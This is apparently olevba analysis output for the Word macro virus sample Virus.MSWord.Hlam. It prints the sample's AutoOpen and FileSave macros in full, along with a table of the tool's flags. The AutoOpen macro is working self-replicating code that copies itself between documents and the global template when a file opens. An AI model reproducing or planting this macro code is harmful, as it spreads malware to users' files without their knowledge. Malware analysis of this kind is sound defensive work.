olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hlam
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hlam - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Hlam - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "±£´æ»î¶¯ÎÄµµ»òÄ£°å"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim ans$
Dim t
Dim nor
Dim kk
Dim file$
Dim fileopen$
Dim FileSave$
Dim tt
Dim kkk

t = 0
nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
    Next kk
End If

file$ = WordBasic.[FileName$]()
fileopen$ = file$ + ":AutoOpen"
FileSave$ = file$ + ":FileSave"
If t <> 1 Then
    WordBasic.MacroCopy fileopen$, "AutoOpen"
    WordBasic.MacroCopy FileSave$, "FileSave"
End If

tt = 0
nor = WordBasic.CountMacros(1)
If nor > 0 Then
    For kkk = 1 To nor
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
            tt = 1
        End If
    Next kkk
End If

If tt <> 1 Then
    WordBasic.MacroCopy "AutoOpen", fileopen$
    WordBasic.MacroCopy "FileSave", FileSave$
End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Hlam - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "±£´æ»î¶¯ÎÄµµ»òÄ£°å"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

